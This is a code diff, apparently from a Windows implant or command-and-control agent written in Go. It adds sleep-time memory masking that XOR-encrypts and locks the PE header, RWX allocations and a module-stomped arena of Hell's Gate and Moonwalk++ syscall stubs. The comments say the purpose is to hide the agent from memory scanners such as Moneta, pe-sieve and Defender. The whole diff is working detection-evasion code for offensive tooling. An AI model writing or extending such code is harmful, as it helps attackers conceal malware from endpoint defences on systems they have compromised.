@@ -148,28 +148,39 @@ func (b *ProtectedBuf) Free() {
 // Internal helpers
 
 type pageRegion struct {
-	base    uintptr
-	size    uintptr
-	oldProt uint32
-	encrypt bool    // XOR-encrypt before hiding (safe only for non-executing regions)
-	key     [32]byte
+	base        uintptr
+	size        uintptr
+	oldProt     uint32
+	encrypt     bool // XOR-encrypt before hiding
+	encryptOnly bool // encrypt but skip PAGE_NOACCESS — safe for executing regions
+	key         [32]byte
 }
 
 func (r *pageRegion) hide() {
 	if r.encrypt {
-		// Make writable, XOR-scramble, then lock.
 		ntProtect(r.base, r.size, windows.PAGE_READWRITE)
 		r.xorInPlace()
+	}
+	if r.encryptOnly {
+		// Restore RX so other goroutines can still execute the region.
+		ntProtect(r.base, r.size, windows.PAGE_EXECUTE_READ)
+		return
 	}
 	r.oldProt, _ = ntProtect(r.base, r.size, windows.PAGE_NOACCESS)
 }
 
 func (r *pageRegion) show() {
+	if r.encryptOnly {
+		// XOR-decrypt back; region is already RX.
+		ntProtect(r.base, r.size, windows.PAGE_READWRITE)
+		r.xorInPlace()
+		ntProtect(r.base, r.size, windows.PAGE_EXECUTE_READ)
+		return
+	}
 	if r.oldProt == 0 {
 		return
 	}
 	if r.encrypt {
-		// Unlock, XOR-restore, then set original protection.
 		ntProtect(r.base, r.size, windows.PAGE_READWRITE)
 		r.xorInPlace()
 	}
@@ -183,15 +194,21 @@ func (r *pageRegion) xorInPlace() {
 	}
 }
 
-// sensitiveRegions collects memory regions a scanner could use to identify
-// or fingerprint the agent:
-//   1. The PE header (hides MZ magic, section table, import table RVAs).
-//   2. All private RWX allocations (our Hell's Gate stubs).
 // collectProtectedRegions returns all memory regions to hide during sleep.
+// Regions that are PAGE_NOACCESS'd before the wait become unreadable to memory
+// scanners (Moneta, pe-sieve, Defender's real-time scan).  Regions marked
+// encrypt:true are also XOR-scrambled so their content is opaque even to
+// scanners that walk page tables without triggering access violations.
+//
+// Covered regions:
+//  1. PE header — hides MZ magic, section table, import table RVAs.
+//  2. Private RWX allocations — catches any stubs not in the stomp arena.
+//  3. Stomp arena — Hell's Gate + Moonwalk++ stubs live in a MEM_IMAGE page;
+//     privateRWXRegions misses MEM_IMAGE, so we add it explicitly.
 func collectProtectedRegions() []pageRegion {
 	var out []pageRegion
 
-	// 1. PE header (first page of the module) — XOR-encrypted before locking
+	// 1. PE header (first page of the module) — XOR-encrypted before locking.
 	var base windows.Handle
 	if err := windows.GetModuleHandleEx(0, nil, &base); err == nil && base != 0 {
 		r := pageRegion{base: uintptr(base), size: protBufPageSize, encrypt: true}
@@ -199,8 +216,22 @@ func collectProtectedRegions() []pageRegion {
 		out = append(out, r)
 	}
 
-	// 2. Private RWX allocations
+	// 2. Private RWX allocations (HGProc stubs that did not fit in stomp arena).
 	out = append(out, privateRWXRegions()...)
+
+	// 3. Stomp arena — Hell's Gate + Moonwalk++ stubs live in a MEM_IMAGE CoW
+	// page carved from version.dll .text.  privateRWXRegions misses MEM_IMAGE,
+	// so add it explicitly.  encryptOnly=true: we XOR-scramble the stub bytes
+	// to defeat signature matching, but skip PAGE_NOACCESS because other
+	// goroutines may call these stubs while this goroutine is sleeping.
+	stompMu.Lock()
+	used := stompCursor - stompBase
+	stompMu.Unlock()
+	if stompBase != 0 && used > 0 {
+		r := pageRegion{base: stompBase, size: used, encrypt: true, encryptOnly: true}
+		rand.Read(r.key[:])
+		out = append(out, r)
+	}
 
 	return out
 }
